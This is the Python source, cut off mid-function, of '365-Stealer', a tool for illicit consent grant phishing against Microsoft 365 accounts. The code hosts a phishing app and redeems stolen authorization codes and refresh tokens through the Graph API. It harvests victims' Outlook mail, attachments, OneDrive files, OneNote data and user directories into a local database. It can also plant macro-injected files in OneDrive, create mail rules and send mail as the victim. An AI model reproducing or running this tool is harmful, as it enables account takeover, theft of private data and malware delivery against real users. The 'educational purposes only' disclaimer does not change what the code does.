#!/usr/bin/env python3

"""
# 365-Stealer is a tool used for performing Illicit Consent Grant attacks.
#
# Created by Vishal Raj at Altered Security Pte Ltd.
# Copyright (C) Altered Security Pte Ltd.
# All rights reserved to Altered Security Pte Ltd.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
#
# This tool is meant for educational purposes only. 
# The creator takes no responsibility of any mis-use of this tool.
"""
import argparse
import base64
import hashlib
import json
import logging
import os
import pathlib
import re
import sqlite3
import ssl
import sys
import threading
import time
import urllib

from concurrent.futures import ThreadPoolExecutor, as_completed
from os import path
from pathlib import Path
from sqlite3 import Error

import msal
import crayons
import flask
import requests
from flask import jsonify
from hurry.filesize import size
from typing import Optional, Tuple
from app_registration import AzureAppRegistration

regex_url = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'localhost|' #localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
database = None

class ArgumentParser:
    def __init__(self):
        self.parser = argparse.ArgumentParser(description="Welcome to 365-Stealer")
        self._add_arguments()

    def _add_arguments(self):
        self.parser.add_argument('--app-registration', help='Azure App Registrations', action='store_true')
        self.parser.add_argument('--set-config', help='Set 365-Stealer Configuration', action='store_true')
        self.parser.add_argument('--get-config', help='Get 365-Stealer Configuration', action='store_true')
        self.parser.add_argument('--code', help='Provide Authorization Code')
        self.parser.add_argument('--token', help='Provide Access Token')
        self.parser.add_argument('--client-id', help='Provide Application Client ID')
        self.parser.add_argument('--client-secret', help='Provide Application Client Secret')
        self.parser.add_argument('--refresh-token', help='Provide Refresh Token')
        self.parser.add_argument('--token-path', help='Provide Access Token file path')
        self.parser.add_argument('--refresh-all', help="Steal all user's data again.", action='store_true')
        self.parser.add_argument('--refresh-user', help="Steal particular user's data again.(Provide EmailID)")
        self.parser.add_argument('--redirect-url', help='Redirect Url')
        self.parser.add_argument('--database-path', help='Provide Database Path')
        self.parser.add_argument('--no-stealing', help='Steal only Tokens', action='store_true')
        self.parser.add_argument('--upload', help="Add files in victim's OneDrive(Provide File Path)")
        self.parser.add_argument('--create-rules', help='Provide json file containing outlook rules')
        self.parser.add_argument('--send-mail', help='Provide json file to send email')
        self.parser.add_argument('--delete-all-data', help='Delete all data from the database!', action='store_true')
        self.parser.add_argument('--delete-user-data', help='Delete specific user data from the database!')
        self.parser.add_argument('--run-app', help='Host the Phising App', action='store_true')
        self.parser.add_argument('--no-ssl', help='Use http(port 80)', action='store_true')
        self.parser.add_argument('--port', help='Provide custom port to Host the Phishing App')
        self.parser.add_argument('--disable-logs', help='Disable all http access logs', action='store_true')
        self.parser.add_argument('--custom-steal', help='Steal specific data', nargs='+', choices=['listusers', 'checklicence', 'outlook', 'onedrive', 'onenote'])
        self.parser.add_argument('--injection', help='Enable Macro Injection', action='store_true')
        self.parser.add_argument('--delay', help='Delay the request by specifying time in seconds while stealing', type=int)

    def parse(self):
        args = self.parser.parse_args()
        if len(sys.argv) == 1:
            self.parser.print_help()
            sys.exit()
        return args

class Banner:
    @staticmethod
    def print_banner():
        banner = """
     .oooo.       .ooo     oooooooo
    .dP""Y88b    .88'     dP"""""""
          ]8P'  d88'      d88888b.
        <88b.  d888P"Ybo.     `Y88b
         `88b. Y88[   ]88       ]88  8888888
    o.   .88P  `Y88   88P o.   .88P
    `8bd88P'    `88bod8'  `8bd88P'

    .oooooo..o     .                        oooo
    d8P'    `Y8   .o8                       `888
    Y88bo.      .o888oo  .ooooo.   .oooo.    888   .ooooo.  oooo d8b
    `"Y8888o.    888   d88' `88b `P  )88b    888  d88' `88b `888""8P
        `"Y88b   888   888ooo888  .oP"888    888  888ooo888  888
    oo    .d8P   888 . 888    .o d8(  888    888  888    .o  888
    8""88888P'   "888" `Y8bod8P' `Y888""8o  o888o `Y8bod8P' d888b
    ________________________________________________________________________

    Github: https://github.com/alteredsecurity/365-Stealer"""
        print(crayons.yellow(banner, bold=True))
        print()


class DatabaseConnection:
    def __init__(self, db_file=None):
        self.db_file = db_file
    
    def db_connection(self):
        """
        Establish a connection to the database.

        Returns:
            sqlite3.Connection: The database connection object.
        """
        self.conn = None
        try:
            self.conn = sqlite3.connect(self.db_file)
        except Error as e:
            print(crayons.red("Error create_connection: " + e, bold=True))
        return self.conn
    
    def create_tables(self,conn):
        """
        Create tables(Attachments, oneDrive, outlook, Allusers, Tokens, Config) in the database.

        Parameters:
            conn (sqlite3.Connection): The database connection object.
        """
        sql1 = '''CREATE TABLE IF NOT EXISTS "Attachments" (
                "id"	            TEXT,
                "username"	        TEXT,
                "data"	            BLOB,
                "filename"	        TEXT,
                "size"	            TEXT,
                "file_data_md5"	    TEXT UNIQUE
            );
            '''
            
        sql2 = '''CREATE TABLE IF NOT EXISTS "oneDrive" (
                "id"	            TEXT UNIQUE,
                "username"	        TEXT,
                "data"	            BLOB,
                "filename"	        TEXT,
                "file_data_md5"	    TEXT UNIQUE
            );
            '''
            
        sql3 ='''CREATE TABLE IF NOT EXISTS "outlook" (
                "id"	        INTEGER UNIQUE,
                "username"	        TEXT,
                "Body"	            TEXT,
                "Sender"	        TEXT,
                "ToRecipients"	    TEXT,
                "BccRecipients"	    TEXT,
                "CcRecipients"	    TEXT,
                "ReplyTo"	        TEXT,
                "Subject"	        TEXT,
                "Flag"	            TEXT,
                "HasAttachments"	TEXT,
                "date"	            TEXT
            );'''
        sql4 = '''CREATE TABLE IF NOT EXISTS "Allusers" (
                "displayName"       TEXT,
                "givenName"         TEXT,
                "jobTitle"	        TEXT,
                "mail"	            TEXT,
                "mobilePhone"	    TEXT,
                "officeLocation"	TEXT,
                "preferredLanguage"	TEXT,
                "surname"	        INTEGER,
                "userPrincipalName"	TEXT,
                "id"	            TEXT UNIQUE
            );'''   
        sql5 = '''CREATE TABLE IF NOT EXISTS "Token" (
                "username"	        TEXT UNIQUE,
                "refreshtoken"	    TEXT,
                "clientId"	        TEXT,
                "clientSecret"	    TEXT,
                "redirectUrl"       TEXT
            );'''
            
        sql6 = '''CREATE TABLE IF NOT EXISTS "Config" (
                "client_id"	                TEXT,
                "client_secret"	            TEXT,
                "redirect_url"	            TEXT,
                "redirect_after_stealing"	TEXT,
                "macros_file_path"	        TEXT,
                "extension_onedrive"        TEXT,
                "delay"                     INTEGER,
                "ID"	                    INTEGER UNIQUE
            );'''
        sql6_1 = '''INSERT OR IGNORE INTO Config
                    (client_id, client_secret, 
                    redirect_after_stealing, macros_file_path,
                    macros_file_path, extension_onedrive, delay, ID)
                    VALUES ('', '', '', '', '', '', '', 1)'''
        try:
            cur = conn.cursor()
            cur.execute(sql1)
            cur.execute(sql2)
            cur.execute(sql3)
            cur.execute(sql4)
            cur.execute(sql5)
            cur.execute(sql6)
            cur.execute(sql6_1)
            conn.commit()
        except Exception as e:
            print(crayons.yellow("[!] Warning createtables: " + str(e), bold=True))


class InputHandler:
    def __init__(self, client_id=None, client_secret=None, redirect_url=None):
        self.client_id = client_id
        self.client_secret = client_secret
        self.redirect_url = redirect_url

    def get_input(self, prompt, pattern=None):
        while True:
            global regex_url
            user_input = input(prompt)
            if user_input.strip():
                # If a pattern is provided, check if the input matches the pattern
                if pattern and not re.match(pattern, user_input):
                    print(crayons.red("[-] Error: Invalid Url provided! Make sure to include 'http://' or 'https://'.", bold=True))
                else:
                    return user_input
            else:
                print(crayons.red("[-] Input cannot be empty. Please try again.", bold=True))
    
    def run(self):
        def get_valid_input(prompt):
            while True:
                user_input = input(prompt)
                if user_input.strip():
                    return user_input
                else:
                    print(crayons.red(" [-] Input cannot be empty. Please try again.", bold=True))

        def get_valid_url(prompt, default=None):
            while True:
                global regex_url
                url = input(prompt).strip()
                if re.match(regex_url, url) or (default is not None and url == ''):
                    return url if url != '' else default
                print(crayons.red(" [-] Error: Invalid Url provided! Make sure to include 'http://' or 'https://'.", bold=True))

        def get_valid_file_path(prompt):
            while True:
                file_path = input(prompt)
                if file_path == "":
                    return file_path
                elif os.path.exists(file_path):
                    if file_path.endswith('.vbs') or file_path.endswith('.ps1'):
                        return file_path
                    else: 
                        print(crayons.red(" [-] Error: Only .vbs or .ps1 file allowed!", bold=True))
                        continue
                print(crayons.red(f" [-] Error: File {file_path} does not exist!", bold=True))

        def get_valid_delay(prompt):
            while True:
                delay = input(prompt).strip()
                if delay == "":
                    return 0
                try:
                    return int(delay)
                except ValueError:
                    print(crayons.yellow(" [!] Error: Only integer value accepted!", bold=True))
        try:
            print(crayons.green(" Welcome to 365-Stealer Configuration.", bold=True))
            if self.client_id is not None and self.client_secret is not None and self.redirect_url is not None:
                redirect_after_stealing = get_valid_url(" Redirect Url After Stealing ==> ", default="/")
                macros_file_path = get_valid_file_path(" Macros File Path ==> ")
                extension_onedrive = input(" OneDrive Extensions ==> ")
                delay = get_valid_delay(" Delay ==> ")
            else:
                self.client_id = get_valid_input(" Client ID ==> ").strip()
                self.client_secret = get_valid_input(" Client Secret ==> ").strip()
                self.redirect_url = get_valid_url(" Redirect Url ==> ")
                redirect_after_stealing = get_valid_url(" Redirect Url After Stealing ==> ", default="/")
                macros_file_path = get_valid_file_path(" Macros File Path(.vbs) or PowerShell File Path(.pd1)  ==> ")
                extension_onedrive = input(" OneDrive Extensions ==> ")
                delay = get_valid_delay(" Delay ==> ")
        except KeyboardInterrupt:
            print(crayons.red("\n [-] Configuration aborted!", bold=True))
            sys.exit()

        # Return or use the collected configurations as needed
        return {
            'client_id': self.client_id,
            'client_secret': self.client_secret,
            'redirect_url': self.redirect_url,
            'redirect_after_stealing': redirect_after_stealing,
            'macros_file_path': macros_file_path,
            'extension_onedrive': extension_onedrive,
            'delay': delay,
        }


class DatabaseOperations:
    def __init__(self, conn):
        self.conn = conn

    def set_config(self, data):
        """
        Updates the configuration of the tool in the database.

        Args:
            data (list): A list containing the updated configuration data.
        """
        try:
            # SQL query to update the configuration in the database
            sql = '''UPDATE Config SET
                        client_id = ?,
                        client_secret = ?,
                        redirect_url = ?,
                        redirect_after_stealing = ?,
                        macros_file_path = ?,
                        extension_onedrive = ?,
                        delay = ?
                    '''
            
                    
            cur = self.conn.cursor()
            cur.execute(sql, data)
            self.conn.commit()

            # Print success message
            print(crayons.green("\n[+] 365-Sealer Configuration set successfully!", bold=True))

            # Print the updated configuration details
            print(crayons.yellow("Client ID: " + data[0], bold=True))
            print(crayons.yellow("Client Secret: " + data[1], bold=True))
            print(crayons.yellow("Redirect Url: " + data[2], bold=True))
            print(crayons.yellow("Redirect Url After Stealing: " + data[3], bold=True))
            print(crayons.yellow("Macros File Path: " + data[4], bold=True))
            print(crayons.yellow("OneDrive Extensions: " + data[5], bold=True))
            print(crayons.yellow("Delay: " + str(data[6]), bold=True))

            # Exit the program
            sys.exit(0)     
        except Exception as e:
            # Print error message and exit the program
            print(crayons.red("Error setConfig: " + str(e), bold=True))
            sys.exit(-1)
    
    def get_config(self):
        try:
            # SQL query to retrieve the configuration details
            sql = """
                  SELECT client_id, client_secret, redirect_url,
                  redirect_after_stealing, macros_file_path, extension_onedrive,
                  delay
                  FROM Config
                  WHERE ID = 1
                  """
            cur = self.conn.cursor()
            cur.execute(sql)
            # Fetch all the rows returned by the query
            rows = cur.fetchall()
            # Return the first row (there should be only one row)
            return rows[0]  
        except Exception as e:
            print(crayons.red("Error getConfig: " + str(e), bold=True))
            return None
    
    def display_config(self,Delay=None):
        """
        Display the configuration of the 365-Stealer.

        Args:
            Delay (int, optional): The delay value. Defaults to None.
        """
        # Get the configuration from the database
        configs = self.get_config()
        # If Delay is not provided, set it to the delay value from the configuration
        if Delay == None:
            Delay = configs[6]
        print(crayons.green(" Your 365-Stealer Configuration.\n", bold=True))
        print(crayons.magenta(" Client ID: ", bold=True) + configs[0])
        print(crayons.magenta(" Client Secret: ", bold=True) + configs[1])
        print(crayons.magenta(" Redirect Url: ", bold=True) + configs[2])
        print(crayons.magenta(" Redirect Url After Stealing: ", bold=True) + configs[3])
        print(crayons.magenta(" Macros File Path: ", bold=True) + configs[4])
        print(crayons.magenta(" OneDrive Extensions: ", bold=True) + configs[5])
        print(crayons.magenta(" Delay: ", bold=True) + str(Delay))
        sys.exit()

    def insert_outlook(self, data):
        """
        Inserts data into the 'outlook' table in the SQLite database.
        
        :param data: A tuple containing the values to be inserted into the 'outlook' table.
        :type data: tuple
        :return: The row ID of the newly inserted row.
        :rtype: int
        """
        
        # SQL query to insert data into the 'outlook' table
        sql = '''
        INSERT OR IGNORE INTO outlook(Id, username, body, Sender, ToRecipients, BccRecipients, 
                                      CcRecipients, replyTo, subject, flag, hasAttachments, date)
        VALUES(?,?,?,?,?,?,?,?,?,?,?,?) 
        '''
        
        # Create a cursor object to execute the SQL query
        cur = self.conn.cursor()

        # Execute the SQL query with the provided data
        cur.execute(sql, data)

        # Commit the changes to the database
        self.conn.commit()

        # Return the row ID of the newly inserted row
        return cur.lastrowid
    
    def delete(self):
        """
        Deletes all data from the database.
        """

        # SQL queries to delete data from different tables
        sql1 = 'DELETE FROM Allusers'
        sql2 = 'DELETE FROM Attachments'
        sql3 = 'DELETE FROM Token'
        sql4 = 'DELETE FROM onedrive'
        sql5 = 'DELETE FROM outlook'

        try:
            cur = self.conn.cursor()

            # Execute delete queries
            cur.execute(sql1)
            cur.execute(sql2)
            cur.execute(sql3)
            cur.execute(sql4)
            cur.execute(sql5)

            # Commit the changes to the database
            self.conn.commit()

            print(crayons.green("[+] All data deleted!", bold=True))
            sys.exit()

        except sqlite3.Error as e:
            # Print error message if any error occurs during deletion
            print(f"An error occurred while deleting: {e}")

        finally:
            # Close the cursor
            if cur:
                cur.close()

    def delete_user(self,user):
        """
        Deletes a user's data from the database.

        Args:
            user (str): The user's principal name.

        Raises:
            sqlite3.Error: If there is an error while deleting the user's data.

        Returns:
            None
        """

        # SQL queries to delete user's data from different tables
        sql1 = 'DELETE FROM Allusers WHERE userPrincipalName = ?'
        sql2 = 'DELETE FROM Attachments WHERE username = ?'
        sql3 = 'DELETE FROM Token WHERE username = ?'
        sql4 = 'DELETE FROM oneDrive WHERE username = ?'
        sql5 = 'DELETE FROM outlook WHERE username = ?'
        sql6 = 'DELETE FROM onedrive WHERE username = ?'
        try:
            cur = self.conn.cursor()

            # Execute the SQL queries to delete user's data
            cur.execute(sql1, (user,))
            cur.execute(sql2, (user,))
            cur.execute(sql3, (user,))
            cur.execute(sql4, (user,))
            cur.execute(sql5, (user,))
            cur.execute(sql6, (user,))
            self.conn.commit()
            print(crayons.green("[+] user's data deleted!", bold=True))
            sys.exit()
        except sqlite3.Error as e:
            print(f"An error occurred while deleting user {user}: {e}")
        finally:
            if cur:
                cur.close()

    @staticmethod
    def _convertToBinaryData(filename):
        # Convert digital data to binary format
        with open(filename, 'rb') as file:
            blobData = file.read()
        return blobData

    def insert_attachmnent(self, Id, username, data, filename):
        """
        Inserts an attachment into the Attachments table.

        Args:
            Id (int): The ID of the attachment.
            username (str): The username associated with the attachment.
            data (bytes): The data of the attachment.
            filename (str): The name of the file.

        Raises:
            Exception: If there is an error inserting the attachment.
        """
        try:
            # Create a hash object for md5 hashing
            md5_hash = hashlib.md5()

            # SQL query to insert the attachment
            sql = """INSERT OR REPLACE INTO Attachments
                    (id, username, data, filename, size, file_data_md5)
                    VALUES (?, ?, ?, ?, ?, ?)"""

            # Convert data into binary format
            data = DatabaseOperations._convertToBinaryData(data)

            # Calculate the size of the data
            filesize = str(size(len(data))) + str("B")

            # Update the hash object with the data
            md5_hash.update(data)

            # Get the md5 hash of the data
            data_digest = md5_hash.hexdigest()

            # Create a tuple with the data to be inserted
            data_tuple = (Id, username, data, filename, filesize, data_digest)

            # Create a cursor object
            cursor = self.conn.cursor()

            # Execute the SQL query with the data tuple
            cursor.execute(sql, data_tuple)

            # Commit the changes to the database
            self.conn.commit()

        except Exception as e:
            # Print the error message if there is an error inserting the attachment
            print(crayons.red("Error insertAttachment: " + str(e), bold=True))

    def insert_BLOB(self, Id, username, data, filename):
        """
        Insert or replace a row in the 'oneDrive' table with the given data.

        Args:
            Id (int): The ID of the user.
            username (str): The username of the user.
            data (bytes): The binary data of the file.
            filename (str): The name of the file.

        Raises:
            Exception: If there is an error while inserting the data.
        """
        try:
            # Initialize the MD5 hash object
            md5_hash = hashlib.md5()

            # SQL query to insert or replace a row in the 'oneDrive' table
            sql = """INSERT OR REPLACE INTO oneDrive
                        (id, username, data, filename, file_data_md5) VALUES (?, ?, ?, ?, ?)"""

            # Convert the data to binary format
            data = DatabaseOperations._convertToBinaryData(data)

            # Update the MD5 hash object with the data
            md5_hash.update(data)

            # Calculate the MD5 digest of the data
            data_digest = md5_hash.hexdigest()

            # Create a tuple containing the data to be inserted
            data_tuple = (Id, username, data, filename, data_digest)

            # Create a cursor object to execute SQL statements
            cursor = self.conn.cursor()

            # Execute the SQL statement with the data tuple
            cursor.execute(sql, data_tuple)

            # Commit the changes to the database
            self.conn.commit()
        except Exception as e:
            # Print an error message if there is an exception
            print(crayons.red("Error insertBLOB: " + str(e), bold=True))

    def insert_token(self, data):
        """
        Inserts token data into the Token table.

        Args:
            data (tuple): A tuple containing the following elements:
                - username (str): The username associated with the token.
                - refreshtoken (str): The refresh token.
                - clientId (str): The client ID.
                - clientSecret (str): The client secret.
                - redirectUrl (str): The redirect URL.

        Raises:
            Exception: If there is an error inserting the token.
        """
        try:
            # SQL query to insert the token
            sql = """INSERT OR REPLACE INTO Token
                                      (username, refreshtoken, clientId, clientSecret, redirectUrl)
                                      VALUES (?, ?, ?, ?, ?)"""

            # Create a cursor object
            cur = self.conn.cursor()

            # Execute the SQL query with the data tuple
            cur.execute(sql, data)

            # Commit the changes to the database
            self.conn.commit()

        except Exception as e:
            # Print the error message if there is an error inserting the token
            print(crayons.red("Error insertToken: " + str(e), bold=True))

    def insert_userlist(self,data):
        try:
            sql = """INSERT OR REPLACE INTO Allusers
                                      (displayName,givenName, jobTitle, mail, mobilePhone, officeLocation, preferredLanguage, surname, userPrincipalName, id)
                                      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"""
                                      
            cur = self.conn.cursor()
            cur.execute(sql, data)
            self.conn.commit()
        except Exception as e:
            print(crayons.red("Error insertuserlist: " + str(e), bold=True))
     
    def refresh_all_tokens(self):
        """
        Refreshes all tokens in the database.

        This function executes a SELECT query to retrieve all tokens from the Token table
        and returns the result. If there is an error or the database is empty, it prints an
        error message and exits the program.

        Returns:
            list: A list of tuples representing the rows in the Token table.
        """
        # Create a ThreadPoolExecutor with a maximum of 5 workers
        with ThreadPoolExecutor(max_workers=5) as executor:
            try:
                sql = "SELECT * from Token"
                cur = self.conn.cursor()
                cur.execute(sql)
                rows = cur.fetchall()
                return rows
            except:
                print(crayons.red("[-] Database is empty", bold=True))
                sys.exit()

    def refresh_user_tokens(self, username):
        """
        Retrieve tokens for a specific user from the database.

        Args:
            username (str): The username of the user.

        Returns:
            list: A list of tuples representing the rows in the Token table
            for the specified user.

        Raises:
            SystemExit: If there is a database error or the user is not found.
        """

        # Execute a SELECT query to retrieve tokens for the specified user
        try:
            sql = "SELECT * from Token where username = ?"
            cur = self.conn.cursor()
            cur.execute(sql, (username,))
            rows = cur.fetchall()
            return rows
        except Exception as e:
            # Print a database error message and exit if there is an error
            print(crayons.red(f"[-] Database error: {e}", bold=True))
            sys.exit()


class O365Stealer(DatabaseOperations, DatabaseConnection):
    global database
    def __init__(self, refresh_token=None, client_id=None, client_secret=None, args=None):
        self.conn = DatabaseConnection(database).db_connection()
        super().__init__(self.conn)
        self.refresh_token = refresh_token
        self.client_id = client_id
        self.client_secret = client_secret
        self.args = args
        self.access_token = self.token = None

    def main(self):
        """
        This method is the main entry point for the program. It handles the command line arguments,
        initializes the necessary variables, and calls the appropriate methods to perform the desired
        actions.
        """
        # Read the configuration settings from the config file
        self.configs = self.get_config()
        self.CLIENTID, self.CLIENTSECRET, self.REDIRECTURL, self.RedirectAfterStealing, self.macros, self.extensions, self.Delay = self.configs
        
        # Set the delay value from the command line argument
        if self.args.delay:
            self.Delay = self.args.delay
            
        # Delete all data if the delete-all-data option is specified
        if self.args.delete_all_data:
            self.delete()
        # Delete user data if the delete-user-data option is specified
        if self.args.delete_user_data:
            self.delete_user(self.args.delete_user_data)

        # Check if a refresh token or code is provided and if client ID and client secret are present
        if self.args.refresh_token is not None or self.args.code is not None:
            if self.args.client_id == None or self.args.client_secret == None:
                if self.args.refresh_all is False:
                    print(crayons.red('[!] ClientId and ClientSecret Required', bold=True))
                sys.exit()
            self.client_id = self.args.client_id
            self.client_secret = self.args.client_secret   
            self.refresh_token = self.args.refresh_token
            self.code = self.args.code

        # Check if a refresh token is provided and acquire a new access token if necessary
        if self.refresh_token is not None and self.refresh_token is not False:
            self.response = self.steal(self.refresh_token)
            if self.response is None:
                if self.args.refresh_all is False:
                    pass
                sys.exit(1)

        # Acquire an access token using the authorization code
        if self.args.code and self.args.redirect_url:
            try:
                self.response = self.steal_access_token_with_authorization_code(self.args.code, self.args.redirect_url)
            except msal.AuthError as e:
                error_message = e.error_response.get('error_description', 'An error occurred.')
                if 'AADSTS70008' in error_message:
                    print(crayons.red("[-] Token has expired due to inactivity. Please re-authenticate.", bold=True))
                    sys.exit(1)
                else:
                    print(crayons.red(f"[-] An error occurred: {error_message}", bold=True))
                    sys.exit(1)
            except Exception as e:
                print(crayons.red(f"[-] An unexpected error occurred: {str(e)}", bold=True))
                sys.exit(1)

        # Use an existing access token
        elif self.args.token:
            self.access_token = self.token = self.args.token
            self.response =  self.steal_with_access_token(self.access_token)

        # Read the access token from a file
        elif self.args.token_path:
            self.response =  self.steal_with_access_token_path(self.args.token_path)
        

        # Extract the victim's email from the response
        try:
            self.victimEmail = (json.loads(self.response.text)['userPrincipalName'])
            print(crayons.green("[+] " + self.victimEmail + " incoming!", bold=True))
            # currentPath contains the path of the current directory
            self.currentPath = os.path.dirname(os.path.abspath(sys.argv[0]))
        except:
            if self.args.refresh_all is False:
                print(crayons.red('[-] Looks like token has been expired or an invalid provided', bold=True))
                sys.exit(1)

        # Create a folder for the victim's data
        try:
            if os.path.isdir(self.currentPath + '/yourVictims') == False:
                os.mkdir(self.currentPath+'/yourVictims')

            self.folder = self.currentPath +'/yourVictims/' + self.victimEmail
        except Exception as e:
            if self.arg.refresh_all is False:
                print(crayons.red('[-] Error: ' + str(e) , bold=True))
            sys.exit(1)
        
        # Insert the refresh token into the database
        if self.refresh_token is not None and self.refresh_token is not False:
            data = (self.victimEmail, self.refresh_token, self.client_id, self.client_secret, self.args.redirect_url)
            self.insert_token(data)

        # Create the victim's folder if it doesn't exist
        try:
            os.mkdir(self.folder)
        except:
            pass
            
        # Write the access token to a file
        os.system("echo "+ self.access_token + " > " + self.folder + "/access_token.txt")
            
        # Write the application configuration to a file
        if self.client_id != None and self.client_secret != None:
            os.system("echo ClientID = "+ self.client_id + " > " + self.folder + "/App_config.txt")
            os.system("echo ClientSecret = "+ self.client_secret + " >> " + self.folder + "/App_config.txt")
            os.system("echo RedirectUrl = "+ self.REDIRECTURL + " >> " + self.folder + "/App_config.txt")

        # Write the refresh token to a file
        if self.refresh_token != None:
            os.system("echo "+ self.refresh_token + " > " + self.folder + "/refresh_token.txt")


        # Upload a file to the victim's OneDrive
        if self.args.upload:
            self.filepath = pathlib.Path(self.args.upload)
            if self.filepath.exists():
                path = self.args.upload
                filename = Path(path).name
                try:
                    with open(path, 'rb') as content:
                        requests.put(
                            "https://graph.microsoft.com/v1.0/me/drive/root:/" + filename + ":/content",
                            headers={"Authorization": self.token, "Content-Type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document"},
                            data=content
                        )
                except Exception as e:
                    print(crayons.red("[-] Error: Something went wrong while accessing " + filename + ", please try again!", bold=True))
                    return

                self.response = requests.get("https://graph.microsoft.com/v1.0/me/drive/root:/" + filename, headers={"Authorization": self.token})

                if self.response.status_code == 201 or self.response.status_code == 200:
                    print(crayons.green("[+] File " + filename + " is uploaded!", bold=True))
                else:
                    print(crayons.red("[-] File " + filename + " not uploaded!", bold=True))
                    print(crayons.red("Error: " + self.response.json()['error']['message'], bold=True))
            else:
                if self.args.refresh_all is False:
                    print(crayons.red("[-] File " + self.args.upload + " not exists"))
            return
        
        # Send an email to the victim's email address
        if self.args.send_mail:
            try:
                with open(self.args.send_mail, 'r') as f:
                    mail = f.read()
                self.sendmail(mail, self.victimEmail, self.token)  
                return
            except FileNotFoundError:
                print(crayons.red("[-] Error: No such file or directory: " + self.args.send_mail , bold=True))
                sys.exit(1)
        
        # Create rules for Outlook
        if self.args.create_rules:
            try:
                with open(self.args.create_rules, 'r') as f:
                    rules = f.read()
                self.create_rules(rules, self.token, self.Delay)
                return
            except FileNotFoundError:
                print(crayons.red("[-] Error: No such file or directory: " + self.args.create_rules , bold=True))
                sys.exit(1)
        
        if self.args.custom_steal is not None:
            
            if "listusers" in self.args.custom_steal:
                self.list_user(self.token)
                
            if "checklicence" in self.args.custom_steal:    
                self.check_licence(self.token, self.victimEmail, self.Delay)
                
            if "outlook" in self.args.custom_steal:    
                self.outlook(self.token, self.folder, self.victimEmail)
                
            if "onedrive" in self.args.custom_steal:    
                self.onedrive(self.token, self.Delay, self.folder, self.extensions, self.macros, self.victimEmail)
                
            if "onenote" in self.args.custom_steal:    
                self.onenote(self.token, self.Delay, self.folder)
        
        if self.args.no_stealing is False and self.args.custom_steal is None:   
            self.list_user(self.token)
            self.check_licence(self.token, self.victimEmail, self.Delay)
            self.outlook(self.token, self.folder, self.victimEmail)
            self.onedrive(self.token, self.Delay, self.folder, self.extensions, self.macros, self.victimEmail)
            self.onenote(self.token, self.Delay, self.folder)
        
        self.directory = self.folder + '/onedrive/'
        try:
            files_in_directory = os.listdir(self.directory)
            filtered_files = [file for file in files_in_directory if file.endswith(".doc")]
            for file in filtered_files:
                path_to_file = os.path.join(self.directory, file)
                os.remove(path_to_file)
        except:
            pass


    def steal(self, refresh_token):
        """
        Get new access token using refresh token.

        This function uses the refresh token to acquire a new access token.
        It also updates the refresh and access tokens in the object.

        Returns:
            Response object if the request is successful. None otherwise.
        """

        # Create a confidential client application
        app = msal.ConfidentialClientApplication(
            self.client_id,
            client_credential=self.client_secret,
            authority='https://login.microsoftonline.com/common'
        )
        try:
            # Acquire a new access token using the refresh token
            token_response = app.acquire_token_by_refresh_token(
                refresh_token,
                scopes=['https://graph.microsoft.com/.default']
            )

            if 'access_token' in token_response:
                # Update the refresh and access tokens in the object
                self.refresh_token = token_response['refresh_token']
                self.access_token = self.token = token_response['access_token']
                access_token = f"Bearer {self.access_token}"
                headers = {"Authorization": access_token}

                # Send a GET request to Graph API to retrieve user information
                response = requests.get("https://graph.microsoft.com/v1.0/me/", headers=headers)
                if response.status_code == 200:
                    return response
                else:
                    print(crayons.red("Failed to retrieve user information", bold=True))
                    return None
            else:
                error_message = token_response.get('error_description', 'Unknown error')
                print(crayons.red(f"[-] Error: {error_message}", bold=True))
                return None

        except Exception as e:
            print(crayons.red(f"[-] Unexpected Error: {str(e)}", bold=True))
            return None

    def steal_access_token_with_authorization_code(self, authorization_code, redirect_url):
        """
        This function acquires an access token using the authorization code and makes a request to the Microsoft Graph API.
        """

        # Create a confidential client application
        app = msal.ConfidentialClientApplication(
            self.client_id,
            client_credential=self.client_secret,
            authority='https://login.microsoftonline.com/common'
        )

        # Acquire access token using the authorization code
        token_response = app.acquire_token_by_authorization_code(
            authorization_code,
            scopes=['https://graph.microsoft.com/.default'],
            redirect_uri=redirect_url
        )

        if 'access_token' in token_response:
            self.refresh_token = token_response['refresh_token']
            self.access_token = token_response['access_token']

            authorization_header = f"Bearer {self.access_token}"

            # Make a request to the Microsoft Graph API
            response = requests.get(
                "https://graph.microsoft.com/v1.0/me/",
                headers={"Authorization": authorization_header}
            )

            if response.status_code == 200:
                return response
            else:
                return None
        else:
            error_message = token_response.get('error_description', 'Unknown error')
            print(crayons.red(f"[-] Error: {error_message}"))
            return None

    def steal_with_access_token(self, access_token):
            """
            Authenticates and makes a request to the Microsoft Graph API using the provided access token.

            Args:
                access_token (str): The access token to use for authentication.

            Returns:
                requests.Response: The response object from the API request.
                                Returns None if the request fails.
            """
            # Construct the authorization header with the access token
            authorization_header = f"Bearer {access_token}"

            # Make a request to the Microsoft Graph API using the access token
            response = requests.get(
                "https://graph.microsoft.com/v1.0/me/",
                headers={"Authorization": authorization_header}
            )

            if response.status_code == 200:
                return response
            else:
                return None
            
    def steal_with_access_token_path(self, access_token_path):
        """
        Authenticates and makes a request to the Microsoft Graph API using the provided access token path.
        """
        try:
            # Read the access token from the file
            with open(access_token_path, 'r') as file:
                self.access_token = self.token = file.read().strip()
        except FileNotFoundError:
            print("[-] File not found")
            return None

        authorization_header = f"Bearer {self.access_token}"

        # Make a request to the Microsoft Graph API using the access token
        response = requests.get(
            "https://graph.microsoft.com/v1.0/me/",
            headers={"Authorization": authorization_header}
        )

        if response.status_code == 200:
            return response
        else:
            return None
        
    def check_licence(self, token, victimEmail, delay):
        """
        Check if the victim has an Office365 license.
        """
        # Wait for the specified delay
        time.sleep(delay)

        # Send a request to the Microsoft Graph API to check if the victim has a license
